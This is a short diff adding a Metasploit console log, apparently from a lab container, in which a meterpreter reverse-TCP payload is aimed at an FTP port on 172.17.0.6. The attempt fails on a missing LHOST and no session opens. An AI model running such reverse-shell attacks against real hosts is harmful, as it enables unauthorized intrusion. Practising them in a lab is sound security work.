@@ -1,0 +1,14 @@
+[*] Using configured payload cmd/linux/http/x86/meterpreter_reverse_tcp
+RHOSTS => 172.17.0.6
+RPORT => 21
+[-] 172.17.0.6:21 - Msf::OptionValidateError One or more options failed to validate: LHOST.
+
+Active sessions
+===============
+
+No active sessions.
+
+[-] Invalid session identifier: 1
+[-] Invalid session identifier: 1
+[-] Invalid session identifier: 1
+[-] Invalid session identifier: 1
